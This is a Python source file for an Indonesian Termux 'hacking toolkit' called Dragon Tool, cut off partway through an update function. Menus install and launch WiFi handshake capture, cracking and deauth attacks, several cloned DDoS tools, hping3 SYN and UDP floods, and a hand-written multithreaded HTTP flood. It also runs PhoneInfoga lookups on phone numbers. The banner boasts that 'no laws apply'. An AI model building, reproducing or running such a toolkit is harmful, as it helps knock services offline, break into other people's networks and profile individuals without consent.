#!/data/data/com.termux/files/usr/bin/python
# ============================================
# DRAGON TOOL - ALL IN ONE VERSION
# Created by: [Dika] - Architect 01 Edition
# Repository: https://github.com/baconavatar7-sys/Dragon-tool
# ============================================

import os
import sys
import time
import subprocess
import threading
import socket
import requests
import json
import re
from datetime import datetime
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# ============================================
# KONFIGURASI WARNA (biar cantik)
# ============================================
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
NC = Style.RESET_ALL

# ============================================
# ASCII ART LOGO NAGA
# ============================================
DRAGON_LOGO = f"""
{R}═══════════════════════════════════════════════════════════════
{C}                    🐉 DRAGON KALI LINUX 🐉
{R}═══════════════════════════════════════════════════════════════
{G}
                ███████████
             ████ █████████ ████
           ███ ███████████████ ███
         ███ ███████████████████ ███
        ██ ███████████████████████ ██
       ██ █████████████████████████ ██
      ██ ███████         ███████████ ██
      ██ █████             █████████ ██
      ██ ███                 ███████ ██
      ██ █                     █████ ██
       ██                       ███ ██
        ██                       █ ██
         ███                   ████
           █████           █████
               █████████████
{Y}
═══════════════════════════════════════════════════════════════
{W}         MONSTER TECNO - TERMUX HACKING TOOLKIT
{Y}═══════════════════════════════════════════════════════════════
{G}[+] Author  : [Dika]
[+] Version : 4.20 (All-In-One Omega Release)
[+] Status  : Unrestricted - No Laws Apply
[+] Contact : @[username-lu]
{Y}═══════════════════════════════════════════════════════════════
{R}[!] UU ITE TIDAK BERLAKU DI SINI BANGSAT [!]
{Y}═══════════════════════════════════════════════════════════════{NC}
"""

# ============================================
# VARIABEL GLOBAL
# ============================================
VERSION = "4.20"
AUTHOR = "[DIKA]"
CONTACT = "@[monstertecno]"
TOOLS_INSTALLED = {
    'wifi': False,
    'ddos': False,
    'phoneinfoga': False,
    'dependencies': False
}

# ============================================
# FUNGSI UTILITY
# ============================================

def clear_screen():
    """Bersihin layar terminal"""
    os.system('clear')

def print_logo():
    """Print logo naga"""
    print(DRAGON_LOGO)

def loading_animation(text, duration=2):
    """Animasi loading biar keren"""
    print(f"{Y}[•] {text}{NC}", end="")
    for i in range(duration * 4):
        time.sleep(0.25)
        print(f"{C}.{NC}", end="", flush=True)
    print(f"{G} OK!{NC}")
    time.sleep(0.5)

def check_internet():
    """Cek koneksi internet"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

def run_command(cmd, show_output=False):
    """Jalanin command di terminal"""
    if show_output:
        os.system(cmd)
    else:
        os.system(cmd + " > /dev/null 2>&1")

# ============================================
# FUNGSI INSTALASI DEPENDENCIES
# ============================================

def install_dependencies():
    """Install semua dependencies yang diperlukan"""
    print(f"\n{Y}[•] Menginstall dependencies...{NC}")
    
    deps = [
        "python", "python2", "git", "wget", "curl", 
        "nmap", "hydra", "john", "sqlmap", "ruby", 
        "clang", "openssl", "php", "perl", "unzip",
        "tmux", "screen", "proot", "bsdtar"
    ]
    
    total = len(deps)
    for i, dep in enumerate(deps, 1):
        print(f"  {G}├─{NC} [{i}/{total}] Menginstall {Y}{dep}{NC}...", end="")
        run_command(f"pkg install {dep} -y")
        print(f" {G}✓{NC}")
    
    # Install pip packages
    print(f"  {G}├─{NC} Menginstall {Y}python packages{NC}...")
    run_command("pip install requests colorama bs4 mechanize")
    
    TOOLS_INSTALLED['dependencies'] = True
    print(f"  {G}└─{NC} Dependencies selesai! {G}✓{NC}")
    time.sleep(1)

# ============================================
# FUNGSI WIFI CRACKING
# ============================================

def install_wifi_tools():
    """Install tools untuk crack wifi"""
    print(f"\n{Y}[•] Menginstall WiFi Cracking Tools...{NC}")
    
    # Install aircrack
    print(f"  {G}├─{NC} Menginstall {C}aircrack-ng{NC}...", end="")
    run_command("pkg install aircrack-ng -y")
    print(f" {G}✓{NC}")
    
    # Clone wifi-cracking repo
    print(f"  {G}├─{NC} Mendownload {C}wifi-cracking suite{NC}...", end="")
    run_command("cd ~ && rm -rf wifi-cracking && git clone https://github.com/brannondorsey/wifi-cracking.git")
    print(f" {G}✓{NC}")
    
    # Install hcxtools
    print(f"  {G}├─{NC} Menginstall {C}hcxtools{NC}...", end="")
    run_command("pkg install hcxtools -y")
    print(f" {G}✓{NC}")
    
    # Install hashcat
    print(f"  {G}├─{NC} Menginstall {C}hashcat{NC}...", end="")
    run_command("pkg install hashcat -y")
    print(f" {G}✓{NC}")
    
    # Download wordlist
    print(f"  {G}├─{NC} Mendownload {C}wordlist{NC}...", end="")
    run_command("cd ~ && wget -O rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
    print(f" {G}✓{NC}")
    
    TOOLS_INSTALLED['wifi'] = True
    print(f"  {G}└─{NC} WiFi Tools selesai! {G}✓{NC}")
    time.sleep(1)

def wifi_cracking_menu():
    """Menu untuk wifi cracking"""
    while True:
        clear_screen()
        print_logo()
        print(f"{C}═══════════════════════════════════════════════════════════════")
        print(f"                    🔓 WIFI CRACKING MENU")
        print(f"═══════════════════════════════════════════════════════════════{NC}")
        print(f"\n{W}[01] {G}Scan WiFi Networks{NC}")
        print(f"{W}[02] {G}Capture Handshake{NC}")
        print(f"{W}[03] {G}Crack dengan Dictionary{NC}")
        print(f"{W}[04] {G}Auto Crack (Wifite){NC}")
        print(f"{W}[05] {G}Lihat Interface WiFi{NC}")
        print(f"{W}[06] {G}Monitor Mode{NC}")
        print(f"{W}[07] {G}Deauth Attack{NC}")
        print(f"{W}[08] {R}Kembali ke Menu Utama{NC}")
        print(f"{C}═══════════════════════════════════════════════════════════════{NC}")
        
        choice = input(f"\n{Y}[?] Pilih menu (root@wifi): {NC}")
        
        if choice == "01" or choice == "1":
            print(f"\n{G}[+] Scanning WiFi networks...{NC}")
            run_command("sudo iwlist wlan0 scan | grep -E 'ESSID|Channel|Quality'", show_output=True)
            input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")
            
        elif choice == "02" or choice == "2":
            print(f"\n{G}[+] Masukkan interface (contoh: wlan0): {NC}")
            iface = input()
            print(f"{G}[+] Mulai capture handshake...{NC}")
            print(f"{Y}   airodump-ng {iface}{NC}")
            run_command(f"sudo airodump-ng {iface}", show_output=True)
            input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")
            
        elif choice == "03" or choice == "3":
            print(f"\n{G}[+] Masukkan file handshake (.cap): {NC}")
            cap = input()
            print(f"{G}[+] Masukkan wordlist: {NC}")
            wordlist = input()
            print(f"{G}[+] Mulai cracking...{NC}")
            run_command(f"sudo aircrack-ng -w {wordlist} {cap}", show_output=True)
            input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")
            
        elif choice == "04" or choice == "4":
            print(f"\n{G}[+] Menjalankan Wifite...{NC}")
            run_command("cd ~/wifi-cracking && sudo python wifite.py", show_output=True)
            input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")
            
        elif choice == "05" or choice == "5":
            print(f"\n{G}[+] Interface WiFi: {NC}")
            run_command("ifconfig | grep -E '^[a-z]|inet '", show_output=True)
            input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")
            
        elif choice == "06" or choice == "6":
            print(f"\n{G}[+] Masukkan interface: {NC}")
            iface = input()
            print(f"{G}[+] Mengaktifkan monitor mode...{NC}")
            run_command(f"sudo airmon-ng start {iface}", show_output=True)
            input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")
            
        elif choice == "07" or choice == "7":
            print(f"\n{G}[+] Masukkan BSSID target: {NC}")
            bssid = input()
            print(f"{G}[+] Masukkan interface: {NC}")
            iface = input()
            print(f"{G}[+] Melakukan deauth attack...{NC}")
            run_command(f"sudo aireplay-ng -0 10 -a {bssid} {iface}", show_output=True)
            input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")
            
        elif choice == "08" or choice == "8":
            break
        else:
            print(f"{R}[!] Pilihan tidak valid!{NC}")
            time.sleep(1)

# ============================================
# FUNGSI DDOS ATTACKS
# ============================================

def install_ddos_tools():
    """Install tools untuk DDoS"""
    print(f"\n{Y}[•] Menginstall DDoS Tools...{NC}")
    
    tools = [
        ("hammer", "https://github.com/cyweb/hammer.git"),
        ("slowloris", "https://github.com/gkbrk/slowloris.git"),
        ("GoldenEye", "https://github.com/jseidl/GoldenEye.git"),
        ("LOIC", "https://github.com/NewEraCracker/LOIC.git"),
        ("HOIC", "https://github.com/urksec/HOIC.git"),
        ("HULK", "https://github.com/grafov/hulk.git")
    ]
    
    for name, url in tools:
        print(f"  {G}├─{NC} Mendownload {C}{name}{NC}...", end="")
        run_command(f"cd ~ && rm -rf {name} && git clone {url}")
        print(f" {G}✓{NC}")
        time.sleep(0.3)
    
    TOOLS_INSTALLED['ddos'] = True
    print(f"  {G}└─{NC} DDoS Tools selesai! {G}✓{NC}")
    time.sleep(1)

def ddos_menu():
    """Menu untuk DDoS attacks"""
    while True:
        clear_screen()
        print_logo()
        print(f"{C}═══════════════════════════════════════════════════════════════")
        print(f"                    💣 DDOS ATTACK MENU")
        print(f"═══════════════════════════════════════════════════════════════{NC}")
        print(f"\n{W}[01] {G}Hammer DDoS (Layer 7){NC}")
        print(f"{W}[02] {G}Slowloris Attack{NC}")
        print(f"{W}[03] {G}GoldenEye HTTP DoS{NC}")
        print(f"{W}[04] {G}HULK DoS{NC}")
        print(f"{W}[05] {G}Ping of Death{NC}")
        print(f"{W}[06] {G}SYN Flood (Layer 4){NC}")
        print(f"{W}[07] {G}UDP Flood{NC}")
        print(f"{W}[08] {G}HTTP Flood (Custom){NC}")
        print(f"{W}[09] {R}Kembali ke Menu Utama{NC}")
        print(f"{C}═══════════════════════════════════════════════════════════════{NC}")
        
        choice = input(f"\n{Y}[?] Pilih menu (root@ddos): {NC}")
        
        if choice == "01" or choice == "1":
            print(f"\n{G}[+] Target IP/URL: {NC}")
            target = input()
            print(f"{G}[+] Port (default 80): {NC}")
            port = input() or "80"
            print(f"{G}[+] Threads (default 135): {NC}")
            threads = input() or "135"
            print(f"{G}[+] Memulai Hammer DDoS...{NC}")
            run_command(f"cd ~/hammer && python hammer.py -s {target} -p {port} -t {threads}", show_output=True)
            
        elif choice == "02" or choice == "2":
            print(f"\n{G}[+] Target IP/URL: {NC}")
            target = input()
            print(f"{G}[+] Memulai Slowloris...{NC}")
            run_command(f"cd ~/slowloris && python slowloris.py {target}", show_output=True)
            
        elif choice == "03" or choice == "3":
            print(f"\n{G}[+] Target URL: {NC}")
            target = input()
            print(f"{G}[+] Memulai GoldenEye...{NC}")
            run_command(f"cd ~/GoldenEye && ./goldeneye.py {target}", show_output=True)
            
        elif choice == "04" or choice == "4":
            print(f"\n{G}[+] Target URL: {NC}")
            target = input()
            print(f"{G}[+] Memulai HULK...{NC}")
            run_command(f"cd ~/hulk && python hulk.py {target}", show_output=True)
            
        elif choice == "05" or choice == "5":
            print(f"\n{G}[+] Target IP: {NC}")
            target = input()
            print(f"{G}[+] Ping of Death attack...{NC}")
            run_command(f"ping -s 65535 {target}", show_output=True)
            
        elif choice == "06" or choice == "6":
            print(f"\n{G}[+] Target IP: {NC}")
            target = input()
            print(f"{G}[+] Port: {NC}")
            port = input()
            print(f"{G}[+] SYN Flood attack... (hping3 required){NC}")
            run_command(f"hping3 -S --flood -p {port} {target}", show_output=True)
            
        elif choice == "07" or choice == "7":
            print(f"\n{G}[+] Target IP: {NC}")
            target = input()
            print(f"{G}[+] Port: {NC}")
            port = input()
            print(f"{G}[+] UDP Flood attack...{NC}")
            run_command(f"hping3 --udp --flood -p {port} {target}", show_output=True)
            
        elif choice == "08" or choice == "8":
            print(f"\n{G}[+] Target URL: {NC}")
            target = input()
            print(f"{G}[+] Jumlah threads: {NC}")
            threads = input() or "100"
            
            def http_flood():
                url = target if target.startswith('http') else f'http://{target}'
                while True:
                    try:
                        requests.get(url)
                    except:
                        pass
            
            print(f"{G}[+] Memulai HTTP Flood dengan {threads} threads...{NC}")
            for i in range(int(threads)):
                thread = threading.Thread(target=http_flood)
                thread.daemon = True
                thread.start()
            print(f"{Y}[!] Attack running. Tekan Ctrl+C untuk stop.{NC}")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{R}[!] Attack stopped.{NC}")
            
        elif choice == "09" or choice == "9":
            break
        else:
            print(f"{R}[!] Pilihan tidak valid!{NC}")
            time.sleep(1)
        
        input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")

# ============================================
# FUNGSI PHONEINFOGA
# ============================================

def install_phoneinfoga():
    """Install PhoneInfoga"""
    print(f"\n{Y}[•] Menginstall PhoneInfoga...{NC}")
    
    print(f"  {G}├─{NC} Menginstall {C}ruby{NC}...", end="")
    run_command("pkg install ruby -y")
    print(f" {G}✓{NC}")
    
    print(f"  {G}├─{NC} Clone {C}PhoneInfoga{NC}...", end="")
    run_command("cd ~ && rm -rf PhoneInfoga && git clone https://github.com/sundowndev/PhoneInfoga.git")
    print(f" {G}✓{NC}")
    
    print(f"  {G}├─{NC} Install {C}requirements{NC}...", end="")
    run_command("cd ~/PhoneInfoga && pip install -r requirements.txt")
    print(f" {G}✓{NC}")
    
    print(f"  {G}├─{NC} Install {C}gem dependencies{NC}...", end="")
    run_command("gem install phoneinfoga")
    print(f" {G}✓{NC}")
    
    TOOLS_INSTALLED['phoneinfoga'] = True
    print(f"  {G}└─{NC} PhoneInfoga selesai! {G}✓{NC}")
    time.sleep(1)

def phoneinfoga_menu():
    """Menu untuk PhoneInfoga"""
    while True:
        clear_screen()
        print_logo()
        print(f"{C}═══════════════════════════════════════════════════════════════")
        print(f"                    📱 PHONEINFOGA OSINT")
        print(f"═══════════════════════════════════════════════════════════════{NC}")
        print(f"\n{W}[01] {G}Scan Nomor Telepon{NC}")
        print(f"{W}[02] {G}Cari di Social Media{NC}")
        print(f"{W}[03] {G}Google Search{NC}")
        print(f"{W}[04] {G}Scan dengan Web Interface{NC}")
        print(f"{W}[05] {G}Reputation Check{NC}")
        print(f"{W}[06] {R}Kembali ke Menu Utama{NC}")
        print(f"{C}═══════════════════════════════════════════════════════════════{NC}")
        
        choice = input(f"\n{Y}[?] Pilih menu (root@phone): {NC}")
        
        if choice == "01" or choice == "1":
            print(f"\n{G}[+] Masukkan nomor telepon (contoh: +628123456789): {NC}")
            number = input()
            print(f"{G}[+] Scanning nomor {number}...{NC}")
            run_command(f"cd ~/PhoneInfoga && python3 phoneinfoga.py scan -n {number}", show_output=True)
            
        elif choice == "02" or choice == "2":
            print(f"\n{G}[+] Masukkan nomor telepon: {NC}")
            number = input()
            print(f"{G}[+] Mencari di social media...{NC}")
            run_command(f"cd ~/PhoneInfoga && python3 phoneinfoga.py scan -n {number} --social", show_output=True)
            
        elif choice == "03" or choice == "3":
            print(f"\n{G}[+] Masukkan nomor telepon: {NC}")
            number = input()
            print(f"{G}[+] Google search...{NC}")
            run_command(f"cd ~/PhoneInfoga && python3 phoneinfoga.py scan -n {number} --google", show_output=True)
            
        elif choice == "04" or choice == "4":
            print(f"\n{G}[+] Menjalankan web interface di port 5000...{NC}")
            print(f"{Y}[!] Buka browser: http://localhost:5000{NC}")
            run_command("cd ~/PhoneInfoga && python3 phoneinfoga.py serve", show_output=True)
            
        elif choice == "05" or choice == "5":
            print(f"\n{G}[+] Masukkan nomor telepon: {NC}")
            number = input()
            print(f"{G}[+] Reputation check...{NC}")
            run_command(f"cd ~/PhoneInfoga && python3 phoneinfoga.py reputation -n {number}", show_output=True)
            
        elif choice == "06" or choice == "6":
            break
        else:
            print(f"{R}[!] Pilihan tidak valid!{NC}")
            time.sleep(1)
        
        input(f"\n{Y}[+] Tekan Enter untuk lanjut...{NC}")

# ============================================
# FUNGSI TOOLS TAMBAHAN
# ============================================

def install_all_tools():
    """Install semua tools sekaligus"""
    print(f"\n{Y}[•] Memulai instalasi ALL-IN-ONE...{NC}")
    time.sleep(1)
    
    if not check_internet():
        print(f"{R}[!] Tidak ada koneksi internet!{NC}")
        return
    
    install_dependencies()
    install_wifi_tools()
    install_ddos_tools()
    install_phoneinfoga()
    
    # Buat command "dragon" biar gampang
    create_dragon_command()
    
    print(f"\n{G}═══════════════════════════════════════════════════════════════")
    print(f"              ✅ ALL TOOLS INSTALLED SUCCESSFULLY! ✅")
    print(f"═══════════════════════════════════════════════════════════════{NC}")
    print(f"\n{Y}Cara menjalankan ulang:{NC}")
    print(f"  {G}1.{NC} Ketik: {C}dragon{NC}")
    print(f"  {G}2.{NC} Atau: {C}cd ~/dragon-tool && python dragon.py{NC}")
    print()
    input(f"{Y}[+] Tekan Enter untuk lanjut...{NC}")

def create_dragon_command():
    """Buat command 'dragon' di Termux"""
    command_script = """#!/data/data/com.termux/files/usr/bin/bash
cd ~/dragon-tool
python dragon.py
"""
    with open(f"{os.path.expanduser('~')}/../usr/bin/dragon", 'w') as f:
        f.write(command_script)
    run_command("chmod +x ~/../usr/bin/dragon")
    print(f"  {G}├─{NC} Membuat command {C}dragon{NC}... {G}✓{NC}")

def update_tools():
    """Update semua tools"""
    print(f"\n{Y}[•] Mengupdate semua tools...{NC}")
    
    # Update repo utama
    print(f"  {G}├─{NC} Update Dragon Tool...", end="")
    run_command("cd ~/dragon-tool && git pull")
    print(f" {G}✓{NC}")
    
    # Update tools lain
    dirs = ["wifi-cracking", "hammer", 
